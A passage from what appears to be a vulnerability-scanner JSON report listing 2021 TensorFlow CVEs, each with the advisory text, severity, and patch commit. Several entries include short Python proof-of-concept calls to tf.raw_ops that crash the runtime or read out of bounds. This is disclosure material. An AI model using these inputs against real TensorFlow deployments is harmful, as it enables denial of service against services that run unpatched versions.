                "markdown": "**Vulnerability CVE-2021-37662**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37662](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37662)|\n\n### Impact\nAn attacker can generate undefined behavior via a reference binding to nullptr in `BoostedTreesCalculateBestGainsPerFeature`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.BoostedTreesCalculateBestGainsPerFeature(\n  node_id_range=[],\n  stats_summary_list=[[1,2,3]],\n  l1=[1.0],\n  l2=[1.0],\n  tree_complexity =[1.0],\n  min_node_weight =[1.17],\n  max_splits=5)\n```\n\nA similar attack can occur in `BoostedTreesCalculateBestFeatureSplitV2`:\n\n```python\nimport tensorflow as tf\n                                                                                                                                                                                                                                                                                          \ntf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2(\n  node_id_range=[],\n  stats_summaries_list=[[1,2,3]],\n  split_types=[``],\n  candidate_feature_ids=[1,2,3,4],\n  l1=[1],     \n  l2=[1],\n  tree_complexity=[1.0],\n  min_node_weight=[1.17],\n  logits_dimension=5)\n```     \n    \nThe  [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) does not validate the input values.\n\n### Patches\nWe have patched the issue in GitHub commit [9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad](https://github.com/tensorflow/tensorflow/commit/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad) and in commit. [429f009d2b2c09028647dd4bb7b3f6f414bbaad7](https://github.com/tensorflow/tensorflow/commit/429f009d2b2c09028647dd4bb7b3f6f414bbaad7).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37649",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37649"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37649",
              "help": {
                "text": "Vulnerability CVE-2021-37649\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37649](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37649)\n### Impact\nThe code for `tf.raw_ops.UncompressElement` can be made to trigger a null pointer dereference: \n\n```python\nimport tensorflow as tf\n\ndata = tf.data.Dataset.from_tensors([0.0])\ntf.raw_ops.UncompressElement(\n  compressed=tf.data.experimental.to_variant(data),\n  output_types=[tf.int64],\n  output_shapes=[2])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/data/experimental/compression_ops.cc#L50-L53) obtains a pointer to a `CompressedElement` from a `Variant` tensor and then proceeds to dereference it for decompressing. There is no check that the `Variant` tensor contained a `CompressedElement`, so the pointer is actually `nullptr`.\n\n### Patches\nWe have patched the issue in GitHub commit [7bdf50bb4f5c54a4997c379092888546c97c3ebd](https://github.com/tensorflow/tensorflow/commit/7bdf50bb4f5c54a4997c379092888546c97c3ebd).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37649**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37649](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37649)|\n\n### Impact\nThe code for `tf.raw_ops.UncompressElement` can be made to trigger a null pointer dereference: \n\n```python\nimport tensorflow as tf\n\ndata = tf.data.Dataset.from_tensors([0.0])\ntf.raw_ops.UncompressElement(\n  compressed=tf.data.experimental.to_variant(data),\n  output_types=[tf.int64],\n  output_shapes=[2])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/data/experimental/compression_ops.cc#L50-L53) obtains a pointer to a `CompressedElement` from a `Variant` tensor and then proceeds to dereference it for decompressing. There is no check that the `Variant` tensor contained a `CompressedElement`, so the pointer is actually `nullptr`.\n\n### Patches\nWe have patched the issue in GitHub commit [7bdf50bb4f5c54a4997c379092888546c97c3ebd](https://github.com/tensorflow/tensorflow/commit/7bdf50bb4f5c54a4997c379092888546c97c3ebd).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.7",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37680",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37680"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37680",
              "help": {
                "text": "Vulnerability CVE-2021-37680\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37680](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37680)\n### Impact\nThe implementation of fully connected layers in TFLite is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/fully_connected.cc#L226):\n\n```cc\nconst int batch_size = input_size / filter-\u003edims-\u003edata[1];\n```\n\nAn attacker can craft a model such that `filter-\u003edims-\u003edata[1]` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [718721986aa137691ee23f03638867151f74935f](https://github.com/tensorflow/tensorflow/commit/718721986aa137691ee23f03638867151f74935f).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. Concurrently, it has also been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37680**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37680](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37680)|\n\n### Impact\nThe implementation of fully connected layers in TFLite is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/fully_connected.cc#L226):\n\n```cc\nconst int batch_size = input_size / filter-\u003edims-\u003edata[1];\n```\n\nAn attacker can craft a model such that `filter-\u003edims-\u003edata[1]` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [718721986aa137691ee23f03638867151f74935f](https://github.com/tensorflow/tensorflow/commit/718721986aa137691ee23f03638867151f74935f).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. Concurrently, it has also been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37689",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37689"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37689",
              "help": {
                "text": "Vulnerability CVE-2021-37689\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37689](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37689)\n### Impact\nAn attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:\n\nThis is caused by the MLIR optimization of `L2NormalizeReduceAxis` operator. The [implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70) unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:\n\n```cc\nbool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast\u003cShapedType\u003e().getRank() - 1 ==\n          *axis.getValues\u003cint\u003e().begin() ||\n      *axis.getValues\u003cint\u003e().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d6b57f461b39fd1aa8c1b870f1b974aac3554955](https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n          \n### Attribution              \nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37689**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37689](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37689)|\n\n### Impact\nAn attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:\n\nThis is caused by the MLIR optimization of `L2NormalizeReduceAxis` operator. The [implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70) unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:\n\n```cc\nbool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast\u003cShapedType\u003e().getRank() - 1 ==\n          *axis.getValues\u003cint\u003e().begin() ||\n      *axis.getValues\u003cint\u003e().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d6b57f461b39fd1aa8c1b870f1b974aac3554955](https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n          \n### Attribution              \nThis vulnerability has been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37673",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37673"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37673",
              "help": {
                "text": "Vulnerability CVE-2021-37673\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37673](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37673)\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.MapStage`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MapStage(\n  key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),\n  indices=tf.constant((0), dtype=tf.int32),\n  values=[tf.constant((0), dtype=tf.int32)],\n  dtypes=[tf.int32,\n  tf.int64],\n  capacity=0,\n  memory_limit=0,\n  container=``,\n  shared_name=``)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L513) does not check that the `key` input is a valid non-empty tensor.\n  \n### Patches\nWe have patched the issue in GitHub commit [d7de67733925de196ec8863a33445b73f9562d1d](https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-37673**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37673](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37673)|\n\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.MapStage`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MapStage(\n  key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),\n  indices=tf.constant((0), dtype=tf.int32),\n  values=[tf.constant((0), dtype=tf.int32)],\n  dtypes=[tf.int32,\n  tf.int64],\n  capacity=0,\n  memory_limit=0,\n  container=``,\n  shared_name=``)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L513) does not check that the `key` input is a valid non-empty tensor.\n  \n### Patches\nWe have patched the issue in GitHub commit [d7de67733925de196ec8863a33445b73f9562d1d](https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37659",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37659"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37659",
              "help": {
                "text": "Vulnerability CVE-2021-37659\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37659](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37659)\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all binary cwise operations that don`t require broadcasting (e.g., gradients of binary cwise operations):\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SqrtGrad(y=[4, 16],dy=[])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/cwise_ops_common.h#L264) assumes that the two inputs have exactly the same number of elements but does not check that. Hence, when the eigen functor executes it triggers heap OOB reads and undefined behavior due to binding to nullptr.\n\n### Patches\nWe have patched the issue in GitHub commit [93f428fd1768df147171ed674fee1fc5ab8309ec](https://github.com/tensorflow/tensorflow/commit/93f428fd1768df147171ed674fee1fc5ab8309ec).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo  360.",
                "markdown": "**Vulnerability CVE-2021-37659**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37659](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37659)|\n\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all binary cwise operations that don`t require broadcasting (e.g., gradients of binary cwise operations):\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SqrtGrad(y=[4, 16],dy=[])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/cwise_ops_common.h#L264) assumes that the two inputs have exactly the same number of elements but does not check that. Hence, when the eigen functor executes it triggers heap OOB reads and undefined behavior due to binding to nullptr.\n\n### Patches\nWe have patched the issue in GitHub commit [93f428fd1768df147171ed674fee1fc5ab8309ec](https://github.com/tensorflow/tensorflow/commit/93f428fd1768df147171ed674fee1fc5ab8309ec).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo  360."
              },
              "properties": {
                "security-severity": "7.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37656",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37656"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37656",
              "help": {
                "text": "Vulnerability CVE-2021-37656\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37656](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37656)\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.RaggedTensorToSparse`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToSparse(\n  rt_nested_splits=[[0, 38, 0]],\n  rt_dense_values=[])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/ragged_tensor_to_sparse_kernel.cc#L30) has an incomplete validation of the splits values: it does not check that they are in increasing order.\n\n### Patches\nWe have patched the issue in GitHub commit [1071f554dbd09f7e101324d366eec5f4fe5a3ece](https://github.com/tensorflow/tensorflow/commit/1071f554dbd09f7e101324d366eec5f4fe5a3ece).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37656**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37656](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37656)|\n\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.RaggedTensorToSparse`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToSparse(\n  rt_nested_splits=[[0, 38, 0]],\n  rt_dense_values=[])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/ragged_tensor_to_sparse_kernel.cc#L30) has an incomplete validation of the splits values: it does not check that they are in increasing order.\n\n### Patches\nWe have patched the issue in GitHub commit [1071f554dbd09f7e101324d366eec5f4fe5a3ece](https://github.com/tensorflow/tensorflow/commit/1071f554dbd09f7e101324d366eec5f4fe5a3ece).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37684",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37684"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37684",
              "help": {
                "text": "Vulnerability CVE-2021-37684\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37684](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37684)\n### Impact\nThe implementations of pooling in TFLite are vulnerable to division by 0 errors as there are no checks for divisors not being 0.\n\n### Patches \nWe have patched the issue in GitHub commit [dfa22b348b70bb89d6d6ec0ff53973bacb4f4695](https://github.com/tensorflow/tensorflow/commit/dfa22b348b70bb89d6d6ec0ff53973bacb4f4695).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37684**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37684](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37684)|\n\n### Impact\nThe implementations of pooling in TFLite are vulnerable to division by 0 errors as there are no checks for divisors not being 0.\n\n### Patches \nWe have patched the issue in GitHub commit [dfa22b348b70bb89d6d6ec0ff53973bacb4f4695](https://github.com/tensorflow/tensorflow/commit/dfa22b348b70bb89d6d6ec0ff53973bacb4f4695).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37644",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37644"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37644",
              "help": {
                "text": "Vulnerability CVE-2021-37644\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37644](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37644)\n### Impact\nProviding a negative element to `num_elements` list argument of  `tf.raw_ops.TensorListReserve` causes the runtime to abort the process due to reallocating a `std::vector` to have a negative number of elements:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.TensorListReserve(\n  element_shape = tf.constant([1]),\n  num_elements=tf.constant([-1]),\n  element_dtype = tf.int32)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/list_kernels.cc#L312) calls `std::vector.resize()` with the new size controlled by input given by the user, without checking that this input is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [8a6e874437670045e6c7dc6154c7412b4a2135e2](https://github.com/tensorflow/tensorflow/commit/8a6e874437670045e6c7dc6154c7412b4a2135e2).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37644**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37644](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37644)|\n\n### Impact\nProviding a negative element to `num_elements` list argument of  `tf.raw_ops.TensorListReserve` causes the runtime to abort the process due to reallocating a `std::vector` to have a negative number of elements:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.TensorListReserve(\n  element_shape = tf.constant([1]),\n  num_elements=tf.constant([-1]),\n  element_dtype = tf.int32)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/list_kernels.cc#L312) calls `std::vector.resize()` with the new size controlled by input given by the user, without checking that this input is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [8a6e874437670045e6c7dc6154c7412b4a2135e2](https://github.com/tensorflow/tensorflow/commit/8a6e874437670045e6c7dc6154c7412b4a2135e2).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37651",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37651"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37651",
              "help": {
                "text": "Vulnerability CVE-2021-37651\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37651](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37651)\n### Impact\nThe implementation for `tf.raw_ops.FractionalAvgPoolGrad` can be tricked into accessing data outside of bounds of heap allocated buffers:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=[0,1,2,3],\n  out_backprop = np.array([[[[541],[541]],[[541],[541]]]]),\n  row_pooling_sequence=[0, 0, 0, 0, 0],\n  col_pooling_sequence=[-2, 0, 0, 2, 0],\n  overlapping=True)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/fractional_avg_pool_op.cc#L205) does not validate that the input tensor is non-empty. Thus, code constructs an empty `EigenDoubleMatrixMap` and then accesses this buffer with indices that are outside of the empty area.\n\n### Patches\nWe have patched the issue in GitHub commit [0f931751fb20f565c4e94aa6df58d54a003cdb30](https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
